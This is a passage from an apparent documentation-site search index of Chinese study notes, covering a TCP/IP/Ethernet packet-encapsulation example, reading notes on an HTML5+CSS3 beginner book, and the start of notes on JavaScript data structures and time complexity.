<p>TCP\u6570\u636e\u5305\u7684\u6807\u5934\u957f\u5ea6\u4e3a20\u5b57\u8282\uff0c\u52a0\u4e0a\u5d4c\u5165HTTP\u7684\u6570\u636e\u5305\uff0c\u603b\u957f\u5ea6\u53d8\u4e3a4980\u5b57\u8282\u3002</p> <p>9.6 IP\u534f\u8bae</p> <p>\u7136\u540e\uff0cTCP\u6570\u636e\u5305\u518d\u5d4c\u5165IP\u6570\u636e\u5305\u3002IP\u6570\u636e\u5305\u9700\u8981\u8bbe\u7f6e\u53cc\u65b9\u7684IP\u5730\u5740\uff0c\u8fd9\u662f\u5df2\u77e5\u7684\uff0c\u53d1\u9001\u65b9\u662f192.168.1.100\uff08\u672c\u673a\uff09\uff0c\u63a5\u6536\u65b9\u662f172.194.72.105\uff08Google\uff09\u3002</p> <p>IP\u6570\u636e\u5305\u7684\u6807\u5934\u957f\u5ea6\u4e3a20\u5b57\u8282\uff0c\u52a0\u4e0a\u5d4c\u5165\u7684TCP\u6570\u636e\u5305\uff0c\u603b\u957f\u5ea6\u53d8\u4e3a5000\u5b57\u8282\u3002</p> <p>9.7 \u4ee5\u592a\u7f51\u534f\u8bae</p> <p>\u6700\u540e\uff0cIP\u6570\u636e\u5305\u5d4c\u5165\u4ee5\u592a\u7f51\u6570\u636e\u5305\u3002\u4ee5\u592a\u7f51\u6570\u636e\u5305\u9700\u8981\u8bbe\u7f6e\u53cc\u65b9\u7684MAC\u5730\u5740\uff0c\u53d1\u9001\u65b9\u4e3a\u672c\u673a\u7684\u7f51\u5361MAC\u5730\u5740\uff0c\u63a5\u6536\u65b9\u4e3a\u7f51\u5173192.168.1.1\u7684MAC\u5730\u5740\uff08\u901a\u8fc7ARP\u534f\u8bae\u5f97\u5230\uff09\u3002</p> <p>\u4ee5\u592a\u7f51\u6570\u636e\u5305\u7684\u6570\u636e\u90e8\u5206\uff0c\u6700\u5927\u957f\u5ea6\u4e3a1500\u5b57\u8282\uff0c\u800c\u73b0\u5728\u7684IP\u6570\u636e\u5305\u957f\u5ea6\u4e3a5000\u5b57\u8282\u3002\u56e0\u6b64\uff0cIP\u6570\u636e\u5305\u5fc5\u987b\u5206\u5272\u6210\u56db\u4e2a\u5305\u3002\u56e0\u4e3a\u6bcf\u4e2a\u5305\u90fd\u6709\u81ea\u5df1\u7684IP\u6807\u5934\uff0820\u5b57\u8282\uff09\uff0c\u6240\u4ee5\u56db\u4e2a\u5305\u7684IP\u6570\u636e\u5305\u7684\u957f\u5ea6\u5206\u522b\u4e3a1500\u30011500\u30011500\u3001560\u3002</p> <p></p> <p>9.8 \u670d\u52a1\u5668\u7aef\u54cd\u5e94</p> <p>\u7ecf\u8fc7\u591a\u4e2a\u7f51\u5173\u7684\u8f6c\u53d1\uff0cGoogle\u7684\u670d\u52a1\u5668172.194.72.105\uff0c\u6536\u5230\u4e86\u8fd9\u56db\u4e2a\u4ee5\u592a\u7f51\u6570\u636e\u5305\u3002</p> <p>\u6839\u636eIP\u6807\u5934\u7684\u5e8f\u53f7\uff0cGoogle\u5c06\u56db\u4e2a\u5305\u62fc\u8d77\u6765\uff0c\u53d6\u51fa\u5b8c\u6574\u7684TCP\u6570\u636e\u5305\uff0c\u7136\u540e\u8bfb\u51fa\u91cc\u9762\u7684\"HTTP\u8bf7\u6c42\"\uff0c\u63a5\u7740\u505a\u51fa\"HTTP\u54cd\u5e94\"\uff0c\u518d\u7528TCP\u534f\u8bae\u53d1\u56de\u6765\u3002</p> <p>\u672c\u673a\u6536\u5230HTTP\u54cd\u5e94\u4ee5\u540e\uff0c\u5c31\u53ef\u4ee5\u5c06\u7f51\u9875\u663e\u793a\u51fa\u6765\uff0c\u5b8c\u6210\u4e00\u6b21\u7f51\u7edc\u901a\u4fe1\u3002</p> <p></p> <p>\u8fd9\u4e2a\u4f8b\u5b50\u5c31\u5230\u6b64\u4e3a\u6b62\uff0c\u867d\u7136\u7ecf\u8fc7\u4e86\u7b80\u5316\uff0c\u4f46\u5b83\u5927\u81f4\u4e0a\u53cd\u6620\u4e86\u4e92\u8054\u7f51\u534f\u8bae\u7684\u6574\u4e2a\u901a\u4fe1\u8fc7\u7a0b\u3002</p> <p>\uff08\u5b8c\uff09</p>"},{"location":"other/H5C3%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E7%B2%BE%E9%80%9A/","title":"HTML5+CSS3 \u4ece\u5165\u95e8\u5230\u7cbe\u901a","text":"<p>\u7edf\u8ba1\u4fe1\u606f\uff1a\u5b57\u6570 5478  \u9605\u8bfb11\u5206\u949f</p> <p>2021-12 \u7c97\u8bfb\u524d\u4e09\u7ae0\uff0c\u4ef7\u503c\u4e0d\u5927</p> <p>\u4e66\u7c4d\u4ecb\u7ecd\uff1aHTML5+CSS3\u4ece\u5165\u95e8\u5230\u7cbe\u901a\uff0c\u674e\u4e1c\u535a\u4e3b\u7f16\uff0c\u6e05\u534e\u5927\u5b66\u51fa\u7248\u793e\u30022013\u5e74\u7b2c\u4e00\u6b21\u51fa\u7248\uff0c\u65f6\u95f4\u5f88\u65e9\uff0c\u5165\u95e8\u7ea7\u522b\u4e66\u7c4d\uff0c\u5927\u90e8\u5206\u7ae0\u8282\u53ef\u4ee5\u5feb\u901f\u9605\u8bfb\u3002</p>"},{"location":"other/H5C3%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E7%B2%BE%E9%80%9A/#web","title":"\u7b2c\u4e00\u7ae0 Web \u5f00\u53d1\u65b0\u65f6\u4ee3","text":""},{"location":"other/H5C3%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E7%B2%BE%E9%80%9A/#html5","title":"HTML5\u7279\u70b9","text":"<ul> <li>\u517c\u5bb9\u6027\u597d\uff08\u4f20\u7edf\u7684 HTML4 \u6bd4\u8f83\u65e7\uff0cXML\u89c4\u5219\u592a\u4e25\u683c\uff0c\u6240\u4ee5\u51fa\u4e86 HTML5\uff09\u5927\u5c0f\u5199\u4e0d\u654f\u611f</li> <li>\u7b80\u5355\uff1aDOCTYPE\uff1butf-8 \u5b57\u7b26\u96c6\u652f\u6301\uff1b\u539f\u751f\u7684 header footer \u53d6\u4ee3 <code>&lt;div className=\"footer\" id=\"footer\"&gt;&lt;/div&gt;</code>\u7684\u5199\u6cd5\uff0c\u76f4\u63a5\u6839\u636e HTML\u8bed\u4e49\u5316\uff0c\u53ef\u4ee5\u63a8\u6d4b\u51fa\u5f53\u524d\u7684\u529f\u80fd\u548c\u7ed3\u6784\u662f\u4ec0\u4e48\u3002Header \u4e0d\u4e00\u5b9a\u51fa\u73b0\u5728\u9875\u9762\u9876\u90e8\uff0c\u53ef\u4ee5\u662f\u67d0\u4e00\u4e2a\u533a\u57df\u7684\u6807\u9898\u3002\u91cd\u8981\u7684\u662f\u8bed\u4e49\uff0c\u800c\u4e0d\u662f\u5728\u754c\u9762\u4e2d\u7684\u4f4d\u7f6e\u3002</li> </ul>"},{"location":"other/H5C3%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E7%B2%BE%E9%80%9A/#_1","title":"\u7f51\u9875\u8bbe\u8ba1\u539f\u5219","text":"<ul> <li>\u4e8c\u516b\u5b9a\u5f8b\uff1a\u6211\u4eec\u4e0d\u662f\u53d6\u60a6\u4e8e\u6240\u6709\u4eba\uff0c\u800c\u662f\u660e\u767d\u54ea\u4e9b\u5ba2\u6237\u662f\u91cd\u8981\u7684\uff0c\u54ea\u4e9b\u6d4f\u89c8\u5668\u662f\u91cd\u8981\u7684\u3002\u4e0d\u9700\u8981\u628a 80% \u7684\u65f6\u95f4\u89e3\u51b3 20% \u7684\u517c\u5bb9\u6027\u6216\u8005\u6781\u7aef\u60c5\u51b5\u4e0a\u3002\u4f18\u5148\u5b8c\u6210\u4e3b\u8981\u7684\u4e1a\u52a1\u3002\u65e9\u671f IE \u6d4f\u89c8\u5668\u7684\u517c\u5bb9\u95ee\u9898\uff0c\u6216\u8005\u67d0\u4e9b\u8001\u7248\u672c\u79fb\u52a8\u7aef\u517c\u5bb9\u95ee\u9898\uff0c\u4e0d\u9700\u8981\u8003\u8651\u3002</li> <li>\u4f2f\u65af\u5854\u5c14\u6cd5\u5219\uff1a\u53d1\u9001\u65f6\u8981\u4fdd\u5b88\uff0c\u63a5\u6536\u65f6\u8981\u5f00\u653e\u3002</li> <li>\u6587\u6863\uff1a\u5728 web \u4e0a\u5f88\u591a\u4e0d\u89c4\u8303\u7684\u6587\u6863\u6216\u8005\u4ee3\u7801\u89c4\u8303\uff0c\u6211\u4eec\u4e0d\u80fd\u8981\u6c42\u5168\u90e8\u7684\u6587\u6863\u89c4\u8303\u6b63\u786e\uff0c\u6211\u4eec\u81ea\u5df1\u8981\u505a\u5230\u5b8c\u5584\u7684\u6587\u6863\u548c\u4ee3\u7801\u89c4\u8303\u3002</li> <li>API\uff1a\u8bf7\u6c42\u53c2\u6570\u5c3d\u53ef\u80fd\u89c4\u8303\uff0c\u540e\u7aef\u8fd4\u56de\u7684\u6570\u636e\u5c3d\u53ef\u80fd\u5f00\u653e\uff08API\u8fd4\u56de\u503c\u53d8\u5316\uff0c\u524d\u7aef\u4e1a\u52a1\u4e0d\u80fd\u5954\u6e83\uff09</li> <li>\u7528\u6237\u4ea4\u4e92\uff1a\u6211\u4eec\u7ed9\u7528\u6237\u7684\u63d0\u793a\u5c3d\u53ef\u80fd\u6e05\u695a\u660e\u786e\uff0c\u9875\u9762\u4ea4\u4e92\u903b\u8f91\u5c3d\u53ef\u80fd\u7b80\u5355\uff1b\u7528\u6237\u8f93\u5165\u7684\u6570\u636e\u8981\u5f00\u653e\uff0c\u8003\u8651\u5230\u7528\u6237\u7684\u9519\u8bef\u8f93\u5165\uff08\u6570\u636e\u7c7b\u578b\u9a8c\u8bc1\uff09\uff0c\u7528\u6237\u7684\u5927\u91cf\u8f93\u5165\uff08\u957f\u6587\u672c\u5206\u9875\u6216\u8005\u6279\u91cf\u6e32\u67d3\uff09\uff0c\u5927\u91cf\u7528\u6237\u8bf7\u6c42\uff08\u9ad8\u5e76\u53d1\u64cd\u4f5c\uff09</li> <li>\u516c\u5171\u51fd\u6570\uff08\u7ec4\u4ef6\uff09\uff1a\u53c2\u6570\u5305\u5bb9\uff0c\u53ef\u80fd\u53c2\u6570\u4e2a\u6570\u6216\u8005\u6570\u636e\u7c7b\u578b\u4e0d\u5bf9\uff1b\u8fd4\u56de\u503c\u660e\u786e\uff08\u786e\u5b9a\u7684\u6570\u636e\u7c7b\u578b\u7b49\uff09</li> <li>\u517c\u5bb9\u6027</li> <li>\u8f6f\u4ef6\u7248\u672c\u66f4\u65b0\uff0c\u9700\u8981\u517c\u5bb9\u65e7\u6570\u636e\uff0c\u5c3d\u53ef\u80fd\u907f\u514d\u51fa\u73b0\u65ad\u5c42\u5f0f\u7684\u66f4\u65b0\uff08Angular\u5c31\u662f\u4e00\u4e2a\u53cd\u4f8b\uff0c\u9700\u8981\u91cd\u6784\u9879\u76ee\uff0c\u9020\u6210\u7528\u6237\u6d41\u5931\uff09</li> <li>\u521d\u59cb\u8bbe\u8ba1\uff1a\u8003\u8651\u5230\u672a\u6765\u53ef\u6269\u5c55\u6027\uff0c\u67d0\u4e2a\u5b57\u6bb5\u4f7f\u7528\u5b57\u7b26\u4e32\u8fd8\u662f\u6570\u7ec4\uff08\u6570\u636e\u7c7b\u578b\u53ef\u6269\u5c55\uff09\uff0c\u6570\u636e\u91cf\u4ece 100 \u5230 10000 \u7684\u754c\u9762\u6548\u679c\uff08\u6570\u636e\u91cf\u7684\u6269\u62db\uff1a\u754c\u9762\u5206\u7247\u6e32\u67d3\uff0c\u8fd8\u662f\u5206\u9875\uff0c\u6027\u80fd\u95ee\u9898\uff09</li> <li>\u4ee3\u7801\u517c\u5bb9\uff1a\u56e2\u961f\u4e2d\u6c34\u5e73\u5c42\u6b21\u4e0d\u9f50\uff0c\u4ee3\u7801\u4e60\u60ef\u4e0d\u540c\u3002\u521d\u59cb\u53ef\u4ee5\u7ea6\u5b9a\u57fa\u672c\u7684\u4e60\u60ef\uff0c\u540c\u6837\u9700\u8981\u517c\u5bb9\u67d0\u4e9b\u540c\u4e8b\u7684\u95ee\u9898\u4ee3\u7801\uff08\u4f8b\u5982\u5199\u5355\u5143\u6d4b\u8bd5\uff0c\u4f7f\u7528 ESLint\uff09\u81ea\u5df1\u63d0\u9ad8\u4ee3\u7801\u53ef\u8bfb\u6027\uff08\u540d\u79f0\u903b\u8f91\u53ef\u8bfb\u6027\uff09\u6ce8\u91ca\u89c4\u8303\uff1b\u63d0\u4ea4\u4fe1\u606f\u89c4\u8303\u7b49\u3002\u5c0f\u578b\u9879\u76ee\u4f7f\u7528 JS\uff0c\u89c4\u8303\u5c11\u4e00\u70b9\uff1b\u5927\u578b\u9879\u76ee\u4f7f\u7528 TS + \u6d4b\u8bd5\uff0c\u63a5\u53e3\u89c4\u8303\u548c\u6587\u6863\u660e\u786e\uff0c\u575a\u6301\u7edf\u4e00\u7684\u8bed\u6cd5\u98ce\u683c</li> <li>\u6e10\u8fdb\u589e\u5f3a\uff0c\u5e73\u7a33\u9000\u5316\uff1a\u5c3d\u91cf\u4f7f\u7528\u5404\u5927\u6d4f\u89c8\u5668\u517c\u5bb9\u6027\u8f83\u597d\u7684\u5199\u6cd5\u548c\u6807\u7b7e\uff0c\u907f\u514d\u4f7f\u7528\u67d0\u4e9b\u6d4f\u89c8\u5668\u652f\u6301\u7684\u683c\u5f0f\u3002video\u4e2d\u7684\u8d44\u6e90\u53ef\u4ee5\u8bbe\u7f6e\u591a\u79cd\u683c\u5f0f\uff08mp4\uff0cswf, ogg\uff09\u90fd\u4e0d\u652f\u6301\u5c31\u76f4\u63a5 A \u6807\u7b7e\u4e0b\u8f7d\u5230\u672c\u5730</li> <li>\u89e3\u51b3\u95ee\u9898\u7b2c\u4e00\uff1a\u7528\u6237\u7684\u9700\u6c42\u662f\u7b2c\u4e00\u4f4d\u7684\u3002\u5fc5\u987b\u6ee1\u8db3\u4ea7\u54c1\u9700\u6c42\u548c\u7528\u6237\u9700\u6c42\uff0c\u518d\u8003\u8651\u4ee3\u7801\u6027\u80fd\uff1b\u683c\u5f0f\u89c4\u8303\uff1b\u6587\u6863\u89c4\u8303\u7b49\u3002</li> </ul>"},{"location":"other/H5C3%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E7%B2%BE%E9%80%9A/#_2","title":"\u5de5\u4f5c\u673a\u5236\uff08\u6700\u597d\u4e24\u4e2a\u673a\u5236\u7ed3\u5408\uff09","text":"<ul> <li>\u516c\u5e73\u673a\u5236\uff1a\u4e00\u4e2a\u56e2\u961f\u4e2d\u5404\u6292\u5df1\u89c1\uff0c\u6700\u540e\u7ed3\u8bba\u8003\u8651\u5230\u5927\u90e8\u5206\u4eba\uff0c\u76f8\u5bf9\u6c11\u4e3b\uff1b\u53ef\u80fd\u82b1\u8d39\u5f88\u591a\u65f6\u95f4</li> <li>\u7cbe\u82f1\u673a\u5236\uff1a\u5c11\u6570\u7cbe\u82f1\u9009\u62e9\u6b63\u786e\u7684\u65b9\u6848\uff0c\u5426\u51b3\u4e0d\u5408\u7406\u7684\u65b9\u6848\uff0c\u76f8\u5bf9\u9ad8\u6548\uff1b\u53ef\u80fd\u9020\u6210\u5185\u90e8\u6028\u8a00</li> </ul>"},{"location":"other/H5C3%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E7%B2%BE%E9%80%9A/#_3","title":"\u9875\u9762\u5e03\u5c40","text":"<ul> <li>block \u5757\u7ea7\u5e03\u5c40</li> <li>inline \u884c\u5185\u5e03\u5c40</li> <li>inline-block \u5185\u90e8\u5757\u7ea7\u5e03\u5c40\uff0c\u5916\u90e8\u884c\u5185\u5e03\u5c40</li> <li>flex \u5e03\u5c40</li> <li>Inline-flex \u5e03\u5c40</li> <li>table \u5e03\u5c40</li> <li>Grid \u5e03\u5c40\uff08\u529f\u80fd\u6700\u5f3a\u5927\uff0c\u5b9e\u9645\u9879\u76ee\u4e2d\u4f7f\u7528\u8f83\u5c11\uff09</li> </ul>"},{"location":"other/H5C3%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E7%B2%BE%E9%80%9A/#html-xml-html5","title":"\u7b2c\u4e8c\u7ae0 HTML XML HTML5","text":"<p><code>&lt;sub&gt;</code> \u4e0b\u6807\u6587\u672c</p> <p><code>&lt;sup&gt;</code> \u4e0a\u6807\u6587\u672c</p> <p><code>&lt;a&gt;</code> \u6807\u7b7e\u7684\u4e24\u4e2a\u7528\u6cd5\uff1a\u6807\u8bc6\u8d85\u94fe\u63a5\uff1b\u4f5c\u4e3a\u9875\u9762\u7684\u951a\u70b9\uff08\u5b9a\u4f4d\u5230\u9875\u9762\u4e2d\u5177\u4f53\u7684\u4f4d\u7f6e\uff09</p> <p>tabIndex \u7528\u6765\u5b9a\u4e49\u5143\u7d20\u7684 Tab \u952e\u8bbf\u95ee\u987a\u5e8f\uff08\u70b9\u51fbTAB\u904d\u5386\u9875\u9762\u4e2d\u7684\u6240\u6709\u94fe\u63a5\u548c\u8868\u5355\u5143\u7d20\uff0c\u6309\u7167 tabIndex \u7684\u987a\u5e8f\u904d\u5386\uff0c\u8bbe\u7f6e -1 \u4e0d\u904d\u5386\uff09</p> <p>titlle \u63d0\u793a\u6587\u672c\uff0c\u4e3a\u5143\u7d20\u63d0\u4f9b\u989d\u5916\u7684\u8bf4\u660e\u4fe1\u606f</p> <p>alt: alternate text \u66ff\u4ee3\u6587\u672c\uff0c\u5e76\u4e0d\u662f\u505a\u63d0\u793a\uff08\u56fe\u7247\u65e0\u6cd5\u663e\u793a\u65f6\uff0c\u663e\u793a\u66ff\u6362\u7684\u6587\u672c\uff09\u4fee\u9970\u6027\u7684\u56fe\u7247\u53ef\u4ee5\u4f7f\u7528\u7a7a\u503c</p> <p>HTML5 \u65b0\u589e\u4e86\u5f88\u591a\u8bed\u4e49\u5316\u7684\u6807\u7b7e\uff0c\u5b9e\u9645\u4f7f\u7528\u7684\u4e0d\u591a</p> <p>input \u5982\u679c\u662f\u6570\u5b57\uff0c\u53ef\u4ee5\u8bbe\u7f6e max min step \u9650\u5236\u8f93\u5165\uff0c\u8fd9\u6837\u5c31\u4e0d\u9700\u8981\u4f7f\u7528 JS \u5904\u7406\u4e86</p> <p>contentEditable: \u662f\u5426\u5141\u8bb8\u7528\u6237\u7f16\u8f91\u5143\u7d20\u4e2d\u7684\u5185\u5bb9</p> <p>designMode\uff1a\u8bbe\u7f6e\u6574\u4e2a\u754c\u9762\u53ef\u7f16\u8f91\u72b6\u6001\uff08on-off\uff09\u5728 on \u7684\u60c5\u51b5\u4e0b\uff0c\u624d\u80fd\u4f7f\u7528 contentEditable \u6ce8\u610f\u6d4f\u89c8\u5668\u517c\u5bb9\u6027</p> <p><code>document.querySelector(\".hightlight\", \".focus\")</code> \u83b7\u53d6\u6ee1\u8db3\u591a\u4e2a\u6761\u4ef6\u7684 DOM \u8282\u70b9</p> <p>parse() \u628a\u5b57\u7b26\u4e32\u5e8f\u5217\u5316\u6210\u5bf9\u8c61</p> <p>stringify() \u628a\u5bf9\u8c61\u53cd\u5e8f\u5217\u5316\u6210\u5b57\u7b26\u4e32</p>"},{"location":"other/H5C3%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E7%B2%BE%E9%80%9A/#html","title":"\u7b2c\u4e09\u7ae0 HTML \u6807\u7b7e\u7684\u4f7f\u7528","text":"<p>\u4e0d\u540c\u6807\u7b7e\u7684\u5177\u4f53\u4f5c\u7528\uff0cmeta \u6807\u7b7e\u7684\u4f5c\u7528\u7b49</p>"},{"location":"other/H5C3%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E7%B2%BE%E9%80%9A/#_4","title":"\u7b2c\u56db\u7ae0 \u8868\u5355","text":"<p>\u8868\u5355\u57fa\u672c\u63d0\u4ea4\u548c\u4ea4\u4e92</p>"},{"location":"other/H5C3%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E7%B2%BE%E9%80%9A/#canvas","title":"\u7b2c\u4e94\u7ae0 canvas","text":"<p>\u57fa\u672c\u4f7f\u7528\u3002canvas \u548c\u9879\u76ee\u5bc6\u5207\u76f8\u5173\u3002\u5982\u679c\u6d89\u53ca canvas \u7ed8\u56fe\u6216\u8005\u6e38\u620f\uff0c\u8fd9\u90e8\u5206\u4f7f\u7528\u975e\u5e38\u591a\u3002\u5982\u679c\u662f\u529e\u516c\u9879\u76ee\uff0c\u73b0\u5728\u63a5\u89e6\u7684\u51e0\u4e2a\u9879\u76ee\u4e2d\uff0c\u57fa\u672c\u6ca1\u6709\u7528\u5230 canvas \u5927\u91cf\u753b\u56fe\u7684\u60c5\u51b5\u3002</p>"},{"location":"other/H5C3%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E7%B2%BE%E9%80%9A/#_5","title":"\u603b\u7ed3","text":"<p>\u8fd9\u672c\u4e66\u4ecb\u7ecd H5 \u7684\u5185\u5bb9\uff0c\u57fa\u7840\u77e5\u8bc6\u4e3a\u4e3b\uff0c\u6ca1\u6709\u592a\u591a\u53ef\u8bfb\u6027\u3002</p> <p>\u5b9e\u9645\u9879\u76ee\u4e2d\uff0c\u7279\u522b\u5173\u6ce8 HTML \u7684\u6bd4\u8f83\u5c11\uff0c\u5173\u952e\u5728\u6570\u636e\u5904\u7406\u548c\u5177\u4f53\u529f\u80fd\u3002\u8fd9\u672c\u4e66\u53ef\u4ee5\u5f52\u6863\uff0c\u57fa\u672c\u7528\u4e0d\u5230\u3002\u65e5\u5e38\u9047\u5230\u67d0\u4e2a\u7ec6\u8282\u77e5\u8bc6\u70b9\uff0c\u76f4\u63a5\u67e5\u7f51\u7edc\u8d44\u6599\u5373\u53ef\u3002</p>"},{"location":"other/JS%20%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/","title":"JS \u6570\u636e\u7ed3\u6784","text":""},{"location":"other/JS%20%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/#data-structure","title":"data structure","text":"<p>\u7edf\u8ba1\u4fe1\u606f\uff1a\u5b57\u6570 38503  \u9605\u8bfb78\u5206\u949f</p> <p>\u6570\u636e\u7ed3\u6784</p> <ol> <li>\u6570\u7ec4 array</li> <li>\u94fe\u8868 linked list</li> <li>\u961f\u5217 queue</li> <li>\u6808 stack</li> <li>\u5806 heap</li> <li>\u6811 tree</li> <li>\u6563\u5217(\u54c8\u5e0c) hash</li> <li>\u56fe graph</li> </ol> <p>\u8fd9\u90e8\u5206\u5185\u5bb9\u9700\u8981\u4e0d\u65ad\u590d\u4e60\uff0c\u6838\u5fc3\u4ee3\u7801\u81ea\u5df1\u6284\u4e09\u6b21\uff0c\u9700\u8981\u9ed8\u5199\u5173\u952e\u903b\u8f91</p> <p>\u53c2\u8003\u4e66</p> <p>\u300a\u5b66\u4e60JavaScript\u6570\u636e\u7ed3\u6784\u4e0e\u7b97\u6cd5\u300b\u5df4\u897f \u683c\u7f57\u7eb3\uff08Loiane Groner\uff09</p> <p>\u300a\u5b9e\u7528\u6570\u636e\u7ed3\u6784\u300b\u6e05\u534e\u5927\u5b66\u6797\u5c0f\u8336\u5199\uff08C\u8bed\u8a00\uff09</p>"},{"location":"other/JS%20%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/#_1","title":"\u7b2c\u4e00\u7ae0 \u6982\u8ff0","text":""},{"location":"other/JS%20%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/#_2","title":"\u6570\u636e\u7ed3\u6784","text":"<p>\u6570\u636e\u7ed3\u6784\uff1a\u628a\u6570\u636e\u505a\u5230\u6709\u6548\u7684\u5b89\u6392\uff0c\u5e76\u5efa\u7acb\u6570\u636e\u4e4b\u95f4\u7684\u5173\u7cfb\uff08\u6570\u636e+\u6570\u636e\u95f4\u7684\u5173\u7cfb\uff09\u3002</p> <p>\u6570\u636e\u7ed3\u6784\u4e09\u4e2a\u8981\u70b9\uff1a\u4fe1\u606f\u4e4b\u95f4\u7684\u903b\u8f91\u5173\u7cfb\uff0c\u4fe1\u606f\u5728\u8ba1\u7b97\u673a\u4e2d\u7684\u7269\u7406\u5b58\u50a8\u65b9\u5f0f\uff0c\u5bf9\u4fe1\u606f\u7684\u8fd0\u7b97\uff08\u589e\u5220\u6539\u67e5\u6392\u5e8f\uff09\u3002</p> <p>\u6570\u636e\u7684\u903b\u8f91\u7ed3\u6784\uff1a\u5206\u4e3a\u7ebf\u6027\u7ed3\u6784\uff08\u7ebf\u6027\u8868\uff09\u548c\u975e\u7ebf\u6027\u7ed3\u6784\uff08\u6811\u548c\u56fe\uff09\u3002</p> <p>\u6570\u636e\u7684\u7269\u7406\u7ed3\u6784\uff1a\u987a\u5e8f\u5b58\u50a8\u7ed3\u6784\uff08\u903b\u8f91\u4e0a\u76f8\u90bb\u7684\u8282\u70b9\u5728\u7269\u7406\u5b58\u50a8\u4e0a\u4e5f\u76f8\u90bb\uff09\u3001\u94fe\u5f0f\u5b58\u50a8\u7ed3\u6784\uff08\u903b\u8f91\u4e0a\u76f8\u90bb\u7684\u8282\u70b9\u5728\u7269\u7406\u4e0a\u4e0d\u4e00\u5b9a\u76f8\u90bb\uff0c\u8282\u70b9\u7684\u903b\u8f91\u5173\u7cfb\u7531\u6307\u9488\u63cf\u8ff0\uff09\u3001\u7d22\u5f15\u5b58\u50a8\u7ed3\u6784\uff08\u5efa\u7acb\u7d22\u5f15\u8868\u6765\u6807\u8bc6\u8282\u70b9\u7684\u5730\u5740\uff09\u3001\u6563\u5217\u5b58\u50a8\u7ed3\u6784\uff08\u6839\u636e\u8282\u70b9\u7684\u5173\u952e\u5b57\u76f4\u63a5\u8ba1\u7b97\u51fa\u8282\u70b9\u7684\u5b58\u50a8\u5730\u5740\uff09\u3002</p> <p>\u6570\u636e &gt; \u6570\u636e\u5143\u7d20 &gt; \u6570\u636e\u9879\uff1a\u6570\u636e\u5bf9\u5e94\u6570\u636e\u8868\uff0c\u6570\u636e\u5143\u7d20\u5bf9\u5e94\u6570\u636e\u8868\u7684\u4e00\u6761\u4fe1\u606f\uff0c\u6570\u636e\u9879\u662f\u6700\u5c0f\u7684\u4fe1\u606f\u5355\u5143\uff08\u5bf9\u5e94\u67d0\u6761\u4fe1\u606f\u7684\u67d0\u4e2a\u5c5e\u6027\uff09</p>"},{"location":"other/JS%20%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/#_3","title":"\u7b97\u6cd5","text":"<p>\u8ba1\u7b97\u548c\u7b97\u6cd5\u7684\u533a\u522b\uff1a\u8ba1\u7b97\u7b80\u5355\u7684\u56db\u5219\u8fd0\u7b97\u76f4\u63a5\u4f7f\u7528\u6570\u5b66\u51fd\u6570\uff0c\u8ba1\u7b97\u590d\u6742\u7684\u95ee\u9898\uff08\u4f8b\u5982\u8ff7\u5bab\u548c\u8d2a\u5403\u86c7\uff09\u9700\u8981\u7b97\u6cd5\u3002\u540c\u4e00\u4e2a\u7b97\u6cd5\u7528\u4e0d\u540c\u7684\u6570\u636e\u7ed3\u6784\u4f1a\u4ea7\u751f\u4e0d\u540c\u7684\u6267\u884c\u6548\u7387\u3002\u6240\u4ee5\u8981\u5b9a\u91cf\u5206\u6790\u4e0d\u540c\u6570\u636e\u7ed3\u6784\u8868\u793a\u7684\u6548\u7387\u548c\u9002\u7528\u7684\u573a\u5408\u3002\u8fd9\u5c31\u662f\u6570\u636e\u7ed3\u6784\u548c\u7b97\u6cd5\u7684\u8054\u7cfb\u3002</p> <p>\u89e3\u51b3\u95ee\u9898\u7684\u6570\u636e\u7ed3\u6784\u5f88\u597d\u7406\u89e3\uff0c\u4f46\u662f\u5b9e\u73b0\u6570\u636e\u7ed3\u6784\u7684\u7b97\u6cd5\u6bd4\u8f83\u96be\u3002</p> <p>\u7b97\u6cd5\u7684\u7279\u70b9\uff1a\u5177\u6709\u8f93\u5165\u8f93\u51fa\uff0c\u6709\u7a77\u6027\uff08\u907f\u514d\u6b7b\u5faa\u73af\uff09\uff0c\u786e\u5b9a\u6027\uff08\u6bcf\u4e00\u6b65\u662f\u660e\u786e\u7684\u7ed3\u679c\uff09\uff0c\u53ef\u884c\u6027\uff08\u7b97\u6cd5\u4e2d\u6bcf\u4e00\u6b65\u901a\u8fc7\u6709\u9650\u6b21\u8fd0\u884c\u53ef\u4ee5\u5b9e\u73b0\uff09\u3002</p>"},{"location":"other/JS%20%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/#o","title":"\u5927O\u8868\u793a\u6cd5\u548c\u65f6\u95f4\u590d\u6742\u5ea6","text":"<p>\u65f6\u95f4\u590d\u6742\u5ea6\uff1a\u628a\u7b97\u6cd5\u4e2d\u5305\u542b\u7b80\u5355\u64cd\u4f5c\u7684\u6b21\u6570\u53eb\u505a\u7b97\u6cd5\u7684\u65f6\u95f4\u590d\u6742\u5ea6\uff0c\u8861\u91cf\u7b97\u6cd5\u7684\u6027\u80fd\u3002\u5927O\u8868\u793a\u6cd5\u5c06\u7b80\u5355\u64cd\u4f5c\u7684\u6b21\u6570\u53d6\u6781\u9650\u83b7\u53d6\uff08\u5e38\u89c1\u7684\u4f18\u52a3\u8bb0\u4f4f\uff09\u3002\u65f6\u95f4\u590d\u6742\u5ea6\u901a\u5e38\u548c\u6570\u636e\u91cf\u7ea7\u6709\u5173\uff1a\u5982\u679c\u6570\u636e\u91cf\u7ea7\u662f\u4ebf\uff0c\u90a3\u4e48\u6700\u5dee\u7684\u7b97\u6cd5\u590d\u6742\u5ea6\u662f 